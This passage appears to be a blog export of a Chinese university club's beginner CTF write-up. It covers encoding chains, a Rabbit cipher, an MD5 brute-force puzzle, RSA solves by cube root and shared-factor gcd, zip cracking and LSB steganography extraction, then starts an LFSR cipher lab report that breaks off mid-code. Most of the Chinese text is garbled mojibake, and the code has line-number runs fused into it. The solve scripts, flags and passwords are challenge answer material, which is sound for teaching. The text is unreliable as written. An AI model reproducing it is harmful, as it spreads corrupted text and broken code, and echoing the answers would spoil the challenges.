base64 -&gt; base 85 -&gt; base 91 -&gt; base 92 -&gt; base 100 å‹ç¼©åŒ…å¯†ç ï¼šHappyHalloween92ï¼š ;K23g2[f*!o9q#12Hb291ï¼š2f,0.&quot;!&quot;R7uMQ:nTwlEL*JB 85: 11joF0J4Om,#U@B9i3rh&lt;-N.I9IY$64ï¼š MTFqb0YwSjRPbSwjVUBCOWkzcmg8LU4uSTlJYFkk base100 ğŸ‘›ğŸ‘ ğŸ‘¥ğŸ‘¦ğŸ‘²ğŸ‘ğŸ‘¬ğŸ‘ªğŸ‘«ğŸ‘–ğŸ¹ğŸ‘˜ğŸ‘ªğŸ‘œğŸ‘–ğŸ‘„ğŸ‘œğŸ˜ğŸ‘´ dino{Just_Base_Me!} crypto 7 é¢˜ç›®æè¿° åŠ å…¥åä¼šä¹‹åï¼Œä½ ä»¬ä¼šè®¤è¯†ä¸€ä¸ªå«å…”å­çš„å­¦å§ã€‚æˆ‘æœŸå¾…å’Œä½ ä»¬è§é¢ã€‚é€ä¸ŠFlagï¼Œæ ¼å¼dino{}ã€‚U2FsdGVkX1&#x2F;+ydnDPowGbjjJXhZxm2MP2AgI è§£é¢˜ Rabbit å¯†ç  dino{Cute_Rabbit} crypto 8 é¢˜ç›®æè¿° ä»€ä¹ˆï¼Ÿä½ ç«Ÿç„¶ä¸ä¼šå£ç®—MD5ï¼Ÿç®—ä»€ä¹ˆé»‘å®¢ï¼Œè¡Œå§ï¼Œå‘Šè¯‰ä½ keyæ˜¯209. å‰©ä¸‹çš„è‡ªå·±æƒ³å»ï¼Œflagå°±æ˜¯MD5éƒ½å‘Šè¯‰ä½ äº†ï¼Œè¿™éƒ½åšä¸å‡ºæ¥ï¼Ÿflagæ ¼å¼ï¼šdino{} ![MD5](&#x2F;Users&#x2F;KarlieLee&#x2F;Desktop&#x2F;md&#x2F;2020 10 25ã€æ‹›æ–°ã€‘ä¿¡å®‰å¤§æŒ‘æˆ˜ 5ad161b8c17049feadbe5a2c2bf41cef&#x2F;MD5.jpg) é¢˜ç›®ï¼š 123456789import hashlib for i in range(32,127): for j in range(32,127): for k in range(32,127): m=hashlib.md5() m.update(&#x27;TASC&#x27;+chr(i)+&#x27;O3RJMV&#x27;+chr(j)+&#x27;WDJKX&#x27;+chr(k)+&#x27;ZM&#x27;) des=m.hexdigest() if &#x27;e9032&#x27; in des and &#x27;da&#x27; in des and &#x27;911513&#x27; in des: print (&quot;f9032994ebcbd08080091151380478b2&quot;) é¢˜è§£ è„šæœ¬è¿è¡Œprint deså°±å¯ä»¥å¾—åˆ°MD5ï¼Œæœ¬é¢˜åšäº†ä¸ªæ··æ·†ï¼Œprintå‡ºæ¥çš„æ˜¯åˆ«çš„ã€‚e9032994dabac08080091151380478a2åšäº†ä¸ªå‡¯æ’’å¯†ç ä½ç§»ï¼Œkey&#x3D;209 è§£ä¸€ä¸‹å¾—åˆ°çš„å°±æ˜¯flag 12345678910import hashlib for i in range(32,127): for j in range(32,127): for k in range(32,127): m=hashlib.md5() m.update(&#x27;TASC&#x27;+chr(i)+&#x27;O3RJMV&#x27;+chr(j)+&#x27;WDJKX&#x27;+chr(k)+&#x27;ZM&#x27;) des=m.hexdigest() if &#x27;e9032&#x27; in des and &#x27;da&#x27; in des and &#x27;911513&#x27; in des: print (des) print (&quot;f9032994ebcbd08080091151380478b2&quot;) dino{e9032994dabac08080091151380478a2} crypto 9 é¢˜ç›®æè¿° RSA é¢˜ç›®ä¸‹è½½é“¾æ¥ï¼šhttps://gryffinbit.lanzous.com/i99Xmhp6bba é¢˜è§£ flag{5b55c69f-398d-47bc-ad37-4f268e8ae4b2} éœ€è¦pythonçš„åŸºç¡€çŸ¥è¯†ã€‚é¦–å…ˆæ‹¿åˆ°ä¸€ä¸ªè„šæœ¬å’Œä¸€ä¸ªoutputçš„æ‰§è¡Œæ–‡ä»¶ã€‚outputæ˜¯è¿™ä¸ªè„šæœ¬çš„è¿è¡Œç»“æœï¼ŒæŠŠoutputæ”¾è¿›ç»ˆç«¯ï¼Œè¿è¡Œæ‰“å°å‡ºæ¥ä¸€ä¸²æ•°å­—ï¼Œå¯¹åº”ç€è„šæœ¬æ¥çœ‹ï¼Œæ¯ä¸²æ•°å­—å¯¹åº”ç€ä¸€ä¸ªprint pow (x,y,z) å‡½æ•°ä»£è¡¨ç€xçš„yæ¬¡æ–¹æ¨¡zã€‚åä¹‹ï¼Œå·²çŸ¥ç»“æœc1æ±‚msg m= gmpy2.iroot(c1,3)[0] 1234from libnum import *from gmpy2 import *m= gmpy2.iroot(c1,3)[0] é¢˜ç›®py 123456789101112131415161718192021222324252627282930313233343536from secret import e1,e2,flagfrom Crypto.Util.number import *msg = bytes_to_long(&quot;=========Hint:e1=&quot;+str(e1)+&quot;=============&quot;)p = getPrime(512)q = getPrime(512)N = p*qprint N#N1=92492770373119584460081987762423642921257844727187836762004909281192459271971634726161143981458071695340994591107972425352531669271078740978901135762304359798469976380706711716397909327202889036066332030534806956149533263677365472375053769919044969923810993041551455618809123044195807478835222921551845223673print pow(msg,3,N)# æ±‚msgçš„3æ¬¡æ–¹æ¨¡N1#ç»“æœc1=28249132350044579687091110964285446575404805400757326954185222098803605008954490760462246663674360047951197296557689347856716297531621331430289344669498939239588624311221464757652619402073234993515450143594805022438694559765344247838048186137683783869848355994953125msg = bytes_to_long(flag)p = getPrime(1024)q = getPrime(1024)N = p*qc = pow(msg, e2, N)print N,e2#N2=27015781782143176377305444708803319343811009307670517970464768333771120997045181708841835585570829548449323842457013912871572311489720085833836018287540353234899258733164425361573491416926759037218022548655403489670177828691645649124879974295681372533797388585691439378293643867458900873524289213226600650695273378214798580343627514294295063280759129845430749116891862775979009255567653541999885963152760100703226634896555671676063304361506854160585739743294659176171738147833879545955904927967598053108666430271719503999512230196683852929862867406713611436850146222646354297511499309143157446775247989917315728885081#e2 æ˜¯æœªçŸ¥çš„ï¼Œæ²¡æœ‰åœ¨outputä¸­æ˜¾ç¤ºprint c#c=6960471390887676836770576717723665527999812876556281118485164081998911577875381908446602930344333654944091349042662834710841686602096786488652321359862587616056255592745697363730350424006430304398118412822538778460783959334956287873626339403915923932633438142296099193868446694776583016981952887671846310453413799566390944727222387714300425256165444782922011140095044159890292073622972447390685582541707094791774266611010707510165706469905665511940032155195482276746347896610980037890500866671279623501021060117466463857453415816945239635341057570437059560066260202940898394476654111403345827675113200431405898577228print(pow(p+q,e1,N ))#ç»“æœS1=1043358162140860962273728863918690254907683549241317489027248804399285815575770538413854959643097587139967903983728298468193229257795104589966904860928102961617976618240299512928763147662509317818932641083203337246219100049009339117603571633877302978817219689048124475419370026280279605865626353406562716520200330156419718727010377305953369496577186008235640834052476174479818668164269356133941979167253165318046864430749941469717776898395077805761110978284600985034996774850879017975655590682283621730288960471273895327469257980443060594976109602435213897419646191853646130932643009667656100697739228571988907108326print(pow(p+e1, q, N))#ç»“æœS2=2367294939363830936563488061919820815242930281093184747199533909423831655805653462926444204702027721204809679004109764873839689145594088483842010258154637719914884625388278232087919706082381019835448905310742695003695950771324141473767622775925225996118945331612570816055138158026344226500272784973866690432399708551301786027237710788172551956598563031161785118254195771411706070504960683710473948125061842911067623875812101363911946970263021272358739604106737786749756437515890114561301491995915709307108967981619075610635000644793538253463486203886648971971414160634218354735619624263269704236191332074536463815524# è§£e1.pyfrom Crypto.Util.number import *from gmpy2 import *from libnum import *c1=28249132350044579687091110964285446575404805400757326954185222098803605008954490760462246663674360047951197296557689347856716297531621331430289344669498939239588624311221464757652619402073234993515450143594805022438694559765344247838048186137683783869848355994953125msg= gmpy2.iroot(c1,3)[0]print(n2s(msg))#e1=2020321 è§£é¢˜py 12345678910111213141516171819202122232425262728from Crypto.Util.number import *from gmpy2 import *from libnum import *S1 = 1043358162140860962273728863918690254907683549241317489027248804399285815575770538413854959643097587139967903983728298468193229257795104589966904860928102961617976618240299512928763147662509317818932641083203337246219100049009339117603571633877302978817219689048124475419370026280279605865626353406562716520200330156419718727010377305953369496577186008235640834052476174479818668164269356133941979167253165318046864430749941469717776898395077805761110978284600985034996774850879017975655590682283621730288960471273895327469257980443060594976109602435213897419646191853646130932643009667656100697739228571988907108326S2 = 2367294939363830936563488061919820815242930281093184747199533909423831655805653462926444204702027721204809679004109764873839689145594088483842010258154637719914884625388278232087919706082381019835448905310742695003695950771324141473767622775925225996118945331612570816055138158026344226500272784973866690432399708551301786027237710788172551956598563031161785118254195771411706070504960683710473948125061842911067623875812101363911946970263021272358739604106737786749756437515890114561301491995915709307108967981619075610635000644793538253463486203886648971971414160634218354735619624263269704236191332074536463815524e1 = 2020321N2 = 27015781782143176377305444708803319343811009307670517970464768333771120997045181708841835585570829548449323842457013912871572311489720085833836018287540353234899258733164425361573491416926759037218022548655403489670177828691645649124879974295681372533797388585691439378293643867458900873524289213226600650695273378214798580343627514294295063280759129845430749116891862775979009255567653541999885963152760100703226634896555671676063304361506854160585739743294659176171738147833879545955904927967598053108666430271719503999512230196683852929862867406713611436850146222646354297511499309143157446775247989917315728885081k1 = S2 - e1k2 = pow(k1,e1,N2)k3 = k2-S1q = gcd(k3,N2)#print(q)#162984526621683870625098586014910615083563535116972222345188747969350923464088799732530801488388575838451737347617234153531460507216470173767572431203228056853761835680227568853138262896922662664650377958457439852663861645573573134863458099139681417307977919507889782957584330019942586292868271385366037674313p = N2//q#print(p)165756727599372791875820541625601955300453776993770577352314168977734910665053298526454521639089078020881208027049933409502069159705827587730047406034448233170464600044968540270031406627778916422623991350852342453286144055883559111480220646693965481942701883316426823927969224691707129909621502373328134683537e2 = 65537p = 165756727599372791875820541625601955300453776993770577352314168977734910665053298526454521639089078020881208027049933409502069159705827587730047406034448233170464600044968540270031406627778916422623991350852342453286144055883559111480220646693965481942701883316426823927969224691707129909621502373328134683537q = 162984526621683870625098586014910615083563535116972222345188747969350923464088799732530801488388575838451737347617234153531460507216470173767572431203228056853761835680227568853138262896922662664650377958457439852663861645573573134863458099139681417307977919507889782957584330019942586292868271385366037674313c = 6960471390887676836770576717723665527999812876556281118485164081998911577875381908446602930344333654944091349042662834710841686602096786488652321359862587616056255592745697363730350424006430304398118412822538778460783959334956287873626339403915923932633438142296099193868446694776583016981952887671846310453413799566390944727222387714300425256165444782922011140095044159890292073622972447390685582541707094791774266611010707510165706469905665511940032155195482276746347896610980037890500866671279623501021060117466463857453415816945239635341057570437059560066260202940898394476654111403345827675113200431405898577228phi = (p-1)*(q-1)d = invert(e2,phi)m = pow(c,d,N2)print(n2s(m))#flag&#123;5b55c69f-398d-47bc-ad37-4f268e8ae4b2&#125; è§£é¢˜è„šæœ¬ï¼š 1234567891011121314151617181920212223242526272829from Crypto.Util.number import *from gmpy2 import *from libnum import *S1 = 1043358162140860962273728863918690254907683549241317489027248804399285815575770538413854959643097587139967903983728298468193229257795104589966904860928102961617976618240299512928763147662509317818932641083203337246219100049009339117603571633877302978817219689048124475419370026280279605865626353406562716520200330156419718727010377305953369496577186008235640834052476174479818668164269356133941979167253165318046864430749941469717776898395077805761110978284600985034996774850879017975655590682283621730288960471273895327469257980443060594976109602435213897419646191853646130932643009667656100697739228571988907108326S2 = 2367294939363830936563488061919820815242930281093184747199533909423831655805653462926444204702027721204809679004109764873839689145594088483842010258154637719914884625388278232087919706082381019835448905310742695003695950771324141473767622775925225996118945331612570816055138158026344226500272784973866690432399708551301786027237710788172551956598563031161785118254195771411706070504960683710473948125061842911067623875812101363911946970263021272358739604106737786749756437515890114561301491995915709307108967981619075610635000644793538253463486203886648971971414160634218354735619624263269704236191332074536463815524e1 = 2020321N2 = 27015781782143176377305444708803319343811009307670517970464768333771120997045181708841835585570829548449323842457013912871572311489720085833836018287540353234899258733164425361573491416926759037218022548655403489670177828691645649124879974295681372533797388585691439378293643867458900873524289213226600650695273378214798580343627514294295063280759129845430749116891862775979009255567653541999885963152760100703226634896555671676063304361506854160585739743294659176171738147833879545955904927967598053108666430271719503999512230196683852929862867406713611436850146222646354297511499309143157446775247989917315728885081k1 = S2 - e1k2 = pow(k1,e1,N2)k3 = k2-S1q = gcd(k3,N2)#print(q)#162984526621683870625098586014910615083563535116972222345188747969350923464088799732530801488388575838451737347617234153531460507216470173767572431203228056853761835680227568853138262896922662664650377958457439852663861645573573134863458099139681417307977919507889782957584330019942586292868271385366037674313p = N2//q#print(p)165756727599372791875820541625601955300453776993770577352314168977734910665053298526454521639089078020881208027049933409502069159705827587730047406034448233170464600044968540270031406627778916422623991350852342453286144055883559111480220646693965481942701883316426823927969224691707129909621502373328134683537e2 = 65537p = 165756727599372791875820541625601955300453776993770577352314168977734910665053298526454521639089078020881208027049933409502069159705827587730047406034448233170464600044968540270031406627778916422623991350852342453286144055883559111480220646693965481942701883316426823927969224691707129909621502373328134683537q = 162984526621683870625098586014910615083563535116972222345188747969350923464088799732530801488388575838451737347617234153531460507216470173767572431203228056853761835680227568853138262896922662664650377958457439852663861645573573134863458099139681417307977919507889782957584330019942586292868271385366037674313c = 6960471390887676836770576717723665527999812876556281118485164081998911577875381908446602930344333654944091349042662834710841686602096786488652321359862587616056255592745697363730350424006430304398118412822538778460783959334956287873626339403915923932633438142296099193868446694776583016981952887671846310453413799566390944727222387714300425256165444782922011140095044159890292073622972447390685582541707094791774266611010707510165706469905665511940032155195482276746347896610980037890500866671279623501021060117466463857453415816945239635341057570437059560066260202940898394476654111403345827675113200431405898577228phi = (p-1)*(q-1)d = invert(e2,phi)m = pow(c,d,N2)print(n2s(m))#flag&#123;5b55c69f-398d-47bc-ad37-4f268e8ae4b2&#125; Misc misc 1 é¢˜ç›®æè¿° è¿™å¼ å›¾ç‰‡ä¸ºä»€ä¹ˆè¿™ä¹ˆå¤§ï¼Ÿ flagæ ¼å¼ä¸ºï¼šdino{} é¢˜ç›®ä¸‹è½½é“¾æ¥ï¼šhttps://gryffinbit.lanzous.com/iRIKZhp6lkj é¢˜è§£ binwalk -e æå–å›¾ç‰‡ä¸­çš„å†…å®¹ï¼Œæ‰«æäºŒç»´ç å¾—åˆ°base64ï¼Œè§£ç ï¼Œç„¶åå†å¯¹ç»“æœURLè§£ç  dino{c879f00c-1761-441f-97dd-14b0b7921278} misc 2 é¢˜ç›®æè¿° äºŒç»´ç ç²‰ç¢æœº flagæ ¼å¼ï¼šflag{} é¢˜ç›®ä¸‹è½½é“¾æ¥ï¼šhttps://gryffinbit.lanzous.com/iPfPIhp6qhg é¢˜è§£ é¢˜è§£ä¸‹è½½é“¾æ¥ï¼šhttps://gryffinbit.lanzous.com/is5wbiaer2b htmlå’Œå›¾ç‰‡æ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶å¤¹å†…ï¼Œæ‰“å¼€html æ‹¼æ¥äºŒç»´ç  æ–¹æ³•ï¼šHTMLè¡¨æ ¼å›¾ç‰‡æ‹¼æ¥ flag{IsQRfun?} misc 3 é¢˜ç›®æè¿° æ¥æ„Ÿå—ä¸‹zipå¥—å¨ƒçš„é­…åŠ›å§ é¢˜ç›®ä¸‹è½½é“¾æ¥ï¼šhttps://gryffinbit.lanzous.com/ipv3Ihp6vyd é¢˜è§£ zipæ˜¯ä¼ªåŠ å¯†ï¼Œè§£å¼€ä¹‹åå¾—åˆ°ä¸€ä¸ªwhydocxtype.docx ç”¨ç¬”è®°æœ¬æ‰“å¼€ç»™äº†hintï¼Œæ˜¯çˆ†ç ´çš„æç¤ºï¼ŒæŠŠè¿™ä¸ªdocxæ ¼å¼æ”¹æˆzipï¼Œæ‰“å¼€é‡Œé¢æœ‰ä¸€ä¸ªflag is hereçš„zipã€‚çˆ†ç ´å¾—åˆ°å¯†ç ï¼Œæ‰“å¼€ã€‚æ˜¯ä¸€ä¸ªvhdï¼ŒWindowsä¸‹ï¼Œæ–‡ä»¶ç®¡ç†ç³»ç»Ÿï¼Œå¯ä»¥å¾—åˆ°flag flag is hereå¯†ç ï¼š114514 flagï¼š dino{f0b91cb7-605a-4ec7-9ae5-6c3a412bd67d} misc 4 é¢˜ç›®æè¿° hiï¼æ–°ç”Ÿä»¬å¥½ï¼Œæ¬¢è¿æ¥åˆ°ä¿¡æ¯å®‰å…¨åä¼šï¼Œè¯·è¸ä¸Šæ¢ç´¢ä¹‹è·¯ï¼Œæ‹¨å¼€å±‚å±‚è¿·é›¾ï¼Œæ‰¾åˆ°åˆ°é’¥åŒ™ï¼Œæ‰“å¼€å®ç®±ï¼Œå¯»æ‰¾flagå§ã€‚æ³¨æ„ï¼šè“å¥äº‘ä¸‹è½½æ–‡ä»¶çš„æ—¶å€™ï¼Œä¸è¦å…±äº«å¯†é’¥ï¼ï¼ï¼ é¢˜ç›®ä¸‹è½½é“¾æ¥ï¼šhttps://gryffinbit.lanzous.com/iigFYhp7a0j é¢˜è§£ ç¬¬ä¸€å±‚ï¼š è€ƒå¯Ÿç‚¹ï¼šæ–‡ä»¶å¤´ä»¥åŠåå…­è¿›åˆ¶æŸ¥çœ‹çš„ç”¨æ³• ä¸€å¼ å›¾ï¼Œåä¼šä¹‹é—¨.jpgï¼Œæ–‡ä»¶å¤´è¢«åˆ æ‰ï¼Œæ‰“å¼€å¤±è´¥ã€‚ç”¨010 editoræ‰“å¼€ï¼Œæ·»åŠ ä¸Šæ–‡ä»¶å¤´ã€‚å¯ä»¥æŠŠå›¾ç‰‡æ‰“å¼€ã€‚æ‰“å¼€ä»¥åæ˜¯ä¸€ä¸ªè“å¥äº‘çš„é“¾æ¥ï¼Œä½†æ˜¯æ²¡æœ‰æå–ç ã€‚ æå–ç éœ€è¦é€šè¿‡010 editoræ‰“å¼€åã€‚åœ¨æœ€åä¸€è¡Œçš„ä½ç½®æ”¾ç€ã€‚ ç¬¬äºŒå±‚ï¼šè€ƒå¯Ÿç‚¹ï¼šç›²æ°´å°ã€‚ ä¸Šä¸€æ­¥çš„è“å¥äº‘æ‰“å¼€åï¼Œæ‹¿åˆ°ä¸€ä¸ªtxt å’Œ ä¸€ä¸ªåŠ å¯†çš„zipã€‚ txtå†…å®¹ï¼š 209æ”»é˜²å®éªŒå®¤çš„å¤§é—¨ï¼Œç”±ä¸€åªè¡¨æƒ…å‡é‡çš„çŒ«çŒ«å®ˆå«ç€ï¼æ‰“è´¥å®ƒï¼è·å¾—é’¥åŒ™ï¼æ¬¸ã€‚ã€‚ã€‚å¯æ˜¯ä½ å‘ç°ï¼Œè¿™ç«Ÿç„¶æ˜¯å½±åˆ†èº«ã€‚ã€‚ã€‚æœºæ™ºçš„ä½ æƒ³åˆ°éœ€è¦æ‰¾åˆ°æœ¬ä½“ï¼Œé€šè¿‡æœ¬ä½“æ¥å‘ç°å½±åˆ†èº«ä¸­çš„å¥¥ç§˜ã€‚ å½±åˆ†èº«è¯´äº†ä¸€ä¸²ä½ ä¸æ‡‚çš„è¯â€œeW91X2xvbmdfZGFuZ19ndWlfaGFpXw&#x3D;&#x3D;â€ you_long_dang_gui_hai_ è§£å¯†é‚£ä¸²è¯ï¼Œå¾—åˆ°çš„å†…å®¹æ˜¯zipçš„å¯†ç ã€‚zipä¸­æ”¾çš„æ˜¯ç›²æ°´å°çš„åŸå›¾å’Œä¸€ä¸ªhintï¼šå®ç®±æˆ‘è—èµ·æ¥äº†ï¼Œé’¥åŒ™åœ¨å½±åˆ†èº«é‚£é‡Œã€‚ é€šè¿‡åŸå›¾çš„ååŠ©ï¼Œå°†å½±åˆ†èº«ä¸­çš„ç›²æ°´å°è§£å‡ºæ¥ã€‚å½±åˆ†èº«é‡Œçš„ç›²æ°´å°è¢«è§£å‡ºæ¥æ˜¯ä¸€ä¸ªkeyï¼Œ keyï¼šwelcome_to_dino209 ç¬¬ä¸‰å±‚ï¼šè€ƒå¯Ÿç‚¹ï¼šå›¾ç‰‡éšå†™ æœ¬ä½“é‡Œï¼Œè¿˜æ”¾ç€ä¸€ä¸ªéšå†™ï¼Œpngé‡Œé¢éšè—äº†ä¸€ä¸ªzipï¼Œå°†zipä»pngé‡Œå‰¥ç¦»å‡ºæ¥ï¼Œå¾—åˆ°çš„zipç”¨keyè§£å‹ï¼Œæ‹¿åˆ°flag.txt Flag: dino{çŒ«çŒ«çš„å‡è§†} misc 5 é¢˜ç›®æè¿° æ–°ç”Ÿä»¬å¥½ï¼Œæ›¾ç»CTFå¤§èµ›ä¸­å‡ºç°è¿‡ä¸€é“yusaå¥³ç¥é¢˜ã€‚å›¾ç‰‡é‡Œçš„å¤§è„¸æŠŠå‡ºé¢˜äººæŠ˜ç£¨çš„å¾ˆæƒ¨ã€‚äºæ˜¯ï¼Œå‡ºé¢˜äººå†³å®šå‡ºä¸€é“å°éº¦è…¹è‚Œç”·çš„é¢˜æ¥æŠ¥å¤ã€‚å¸Œæœ›ä½ ä»¬ç©çš„å¼€å¿ƒã€‚å°éº¦è…¹è‚Œç”·ï¼Œæ°¸è¿œæ»´ç¥ï¼ é¢˜ç›®ä¸‹è½½åœ°å€ï¼šhttps://gryffinbit.lanzous.com/iPNslhp7n5c é¢˜è§£ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106# -*- coding:UTF-8 -*-from PIL import Imagedef mod(x,y): return x%y;def toasc(strr): return int(strr, 2)#leä¸ºæ‰€è¦æå–çš„ä¿¡æ¯çš„é•¿åº¦ï¼Œstr1ä¸ºåŠ å¯†è½½ä½“å›¾ç‰‡çš„è·¯å¾„ï¼Œstr2ä¸ºæå–æ–‡ä»¶çš„ä¿å­˜è·¯å¾„def func(le,str1,str2): a=&quot;&quot; b=&quot;&quot; im = Image.open(str1) lenth = le*8 width = im.size[0] height = im.size[1] count = 0 for h in range(0, height): for w in range(0, width): #è·å¾—(w,h)ç‚¹åƒç´ çš„å€¼ pixel = im.getpixel((w, h)) #æ­¤å¤„ä½™3ï¼Œä¾æ¬¡ä»Rã€Gã€Bä¸‰ä¸ªé¢œè‰²é€šé“è·å¾—æœ€ä½ä½çš„éšè—ä¿¡æ¯ if count%3==0: count+=1 b=b+str((mod(int(pixel[0]),2))) if count ==lenth: break if count%3==1: count+=1 b=b+str((mod(int(pixel[1]),2))) if count ==lenth: break if count%3==2: count+=1 b=b+str((mod(int(pixel[2]),2))) if count ==lenth: break if count == lenth: break with open(str2,&quot;wb&quot;) as f: for i in range(0,len(b),8): #ä»¥æ¯8ä½ä¸ºä¸€ç»„äºŒè¿›åˆ¶ï¼Œè½¬æ¢ä¸ºåè¿›åˆ¶ stra = toasc(b[i:i+8]) #å°†è½¬æ¢åçš„åè¿›åˆ¶æ•°è§†ä¸ºasciiç ï¼Œå†è½¬æ¢ä¸ºå­—ç¬¦ä¸²å†™å…¥åˆ°æ–‡ä»¶ä¸­ f.write(chr(stra)) stra =&quot;&quot; f.closed#æ–‡ä»¶é•¿åº¦le = 50#å«æœ‰éšè—ä¿¡æ¯çš„å›¾ç‰‡new = &quot;/Users/KarlieLee/Downloads/f1ag/å°éº¦è‚Œè‚‰ç”·Dino.png&quot;#ä¿¡æ¯æå–å‡ºåæ‰€å­˜æ”¾çš„æ–‡ä»¶tiqu = &quot;/Users/KarlieLee/Desktop/f1ag.txt&quot;func(le,new,tiqu) lsbéšå†™ï¼Œéœ€è¦ä¸‹è½½è“å¥äº‘é‡Œçš„åŸå›¾zip flagï¼š dino{Dino209_yyds}","categories":[{"name":"write up","slug":"write-up","permalink":"https://gryffinbit.top/categories/write-up/"}],"tags":[{"name":"ç¬¬ä¸€å±Šä¿¡å®‰å¤§æŒ‘æˆ˜","slug":"ç¬¬ä¸€å±Šä¿¡å®‰å¤§æŒ‘æˆ˜","permalink":"https://gryffinbit.top/tags/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98/"}],"author":"Gryffinbit"},{"title":"LSFRæµå¯†ç å®éªŒ","slug":"LSFRæµå¯†ç ","date":"2020-08-20T15:13:21.000Z","updated":"2024-11-12T06:59:29.000Z","comments":true,"path":"2020/08/20/LSFRæµå¯†ç /","permalink":"https://gryffinbit.top/2020/08/20/LSFR%E6%B5%81%E5%AF%86%E7%A0%81/","excerpt":"","text":"LFSRæµå¯†ç  å®éªŒä¸€ã€å®éªŒé¢˜ç›®LFSRæµå¯†ç  äºŒã€å®éªŒç›®çš„å’Œè¦æ±‚ç¼–ç¨‹å®ç°ç®€å•åœ°çº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨ï¼Œç†è§£å…¶å·¥ä½œåŸç†ï¼ŒæŒæ¡æµå¯†ç çš„ç®—æ³•ç»“æ„å’ŒåŠ è§£å¯†è¿‡ç¨‹ã€‚åˆ©ç”¨C++è¯­è¨€å®ç°LFSRã€‚é€šè¿‡ä¸åŒåˆå§‹çŠ¶æ€ç”Ÿæˆç›¸åº”åºåˆ—ï¼Œè§‚å¯Ÿå…¶å‘¨æœŸç‰¹ç‚¹ã€‚åˆ©ç”¨ç”Ÿæˆçš„åºåˆ—å¯¹æ–‡æœ¬è¿›è¡ŒåŠ å¯†å’Œè§£å¯†è¿ç®—ã€‚ ä¸‰ã€å®éªŒç¯å¢ƒclion å››ã€å®éªŒå†…å®¹ç»™å®šçš„ LFSR ç»“æ„å¦‚å›¾ï¼Œç¨‹åºå®ŒæˆåŠŸèƒ½ï¼š ï¼ˆ1ï¼‰ç”±ç»™å®šçš„åˆå§‹çŠ¶æ€åºåˆ—ç”Ÿæˆå¯†é’¥åºåˆ—ï¼ˆ2ï¼‰é€‰æ‹©è¿›è¡Œæ–‡ä»¶åŠ å¯†è¿˜æ˜¯è§£å¯†ï¼ˆ3ï¼‰å¦‚æœé€‰æ‹©æ–‡ä»¶åŠ å¯†ï¼Œåˆ™ä» in.txt ä¸­è¯»å–æ˜æ–‡ï¼Œç”¨å¯†é’¥æµåºåˆ—è¿›è¡ŒåŠ å¯†ï¼Œå¯†æ–‡ä¿å­˜äº out.txt ä¸­ï¼›å¦‚æœé€‰æ‹©æ–‡ä»¶è§£å¯†ï¼Œåˆ™ä» out.txt ä¸­è¯»å–å¯†æ–‡ï¼Œç”¨å¯†é’¥æµåºåˆ—è¿›è¡Œè§£å¯†ï¼Œå¯†æ–‡ä¿å­˜äº in.txt ä¸­ã€‚ äº”ã€ç®—æ³•æè¿°åŠå®éªŒæ­¥éª¤$$a_{n+t}&#x3D;c_na_t\\oplus c_{n-1}a_{t+1}\\oplusâ€¦.\\oplus c_1a_{n+t-1},\\ t&#x3D;1,2,3..$$ è¯¥å®éªŒä»¥äº”çº§ä¸ºä¾‹ï¼Œn&#x3D;5ï¼Œä»£å…¥å…¬å¼ï¼Œæ ¹æ®å›¾ä¸­çš„å¼‚æˆ–å…³ç³»å¾—åˆ° $$a_{5+t}&#x3D;a_t\\oplus a_{3+t},t&#x3D;1,2,â€¦$$ æ ¹æ®è¯¥å…¬å¼ï¼Œç”Ÿæˆå¯†é’¥åºåˆ— $$a_6,a_7,a_8â€¦â€¦â€¦.$$ æµå¯†ç çš„æ“ä½œåŸç†ï¼Œå°†æ˜æ–‡åˆ’åˆ†ä¸ºå­—ç¬¦æˆ–ç¼–ç çš„åŸºæœ¬å•å…ƒã€‚æ¯ä¸ªå­—ç¬¦å…«å­—èŠ‚ï¼Œæ¯ä¸ªå­—ç¬¦åˆ†åˆ«ä¸å¯†é’¥æµè¿›è¡ŒåŠ å¯†ã€‚ä¾‹å¦‚æŠŠå­—ç¬¦è½¬æ¢ä¸ºasciiç çš„äºŒè¿›åˆ¶å½¢å¼ç„¶åä¸éšæœºå¯†é’¥æµè¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œå¹¶è¾“å‡ºç»“æœ æ¶ˆæ¯æµ: $$m&#x3D;m_1m_2m_3â€¦â€¦m_i\\in M$$ åŠ å¯†è¿‡åï¼š $$c_i&#x3D;E_k(m_i)$$ å…­ã€è°ƒè¯•è¿‡ç¨‹åŠç»“æœï¼ˆé™„æˆªå›¾ï¼‰ ä¸ƒã€æ€»ç»“ä½“ä¼šâ“ä»£ç å¦‚ä½•å°†æ•°å­—åŒ–çš„æ˜æ–‡ä¸æµå¯†é’¥å¼‚æˆ–æˆå¯†æ–‡ï¼Ÿ â€¼ï¸å°†æ˜æ–‡åˆ’åˆ†ä¸ºå­—ç¬¦æˆ–ç¼–ç çš„åŸºæœ¬å•å…ƒã€‚æ¯ä¸ªå­—ç¬¦å…«å­—èŠ‚ï¼Œæ¯ä¸ªå­—ç¬¦åˆ†åˆ«ä¸å¯†é’¥æµè¿›è¡ŒåŠ å¯†ã€‚ä¾‹å¦‚æŠŠå­—ç¬¦è½¬æ¢ä¸ºasciiç çš„äºŒè¿›åˆ¶å½¢å¼ç„¶åä¸éšæœºå¯†é’¥æµè¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œå¹¶è¾“å‡ºç»“æœ å…«ã€æºä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#include&lt;iostream&gt;#include&lt;vector&gt;#include&lt;cmath&gt;#include&lt;fstream&gt;using namespace std;int main()&#123;/*ä¸‹é¢æ˜¯å¯†é’¥çš„äº§ç”Ÿ*///åˆå§‹çº§æ•°ä¸º5ï¼Œå‘¨æœŸä¸º31 int a[31]=&#123;1,1,0,0,1&#125;; //åˆå§‹çš„æ¿€æ´»åºåˆ— for(int k=5;k&lt;31;++k) a[k]=(a[k-2]+a[k-5])%2; //è¿™ä¸€æ­¥æ˜¯æ ¹æ®å…¬å¼$a_&#123;5+t&#125;=a_t\\oplus a_&#123;3+t&#125;,t=1,2,... %2å³ï¼šå¼‚æˆ–è¿ç®—ä¹Ÿæ˜¯æ¨¡2åŠ æ³•è¿ç®— cout&lt;&lt;&quot;å¯†é’¥å¦‚ä¸‹ï¼š&quot;&lt;&lt;endl; for(int 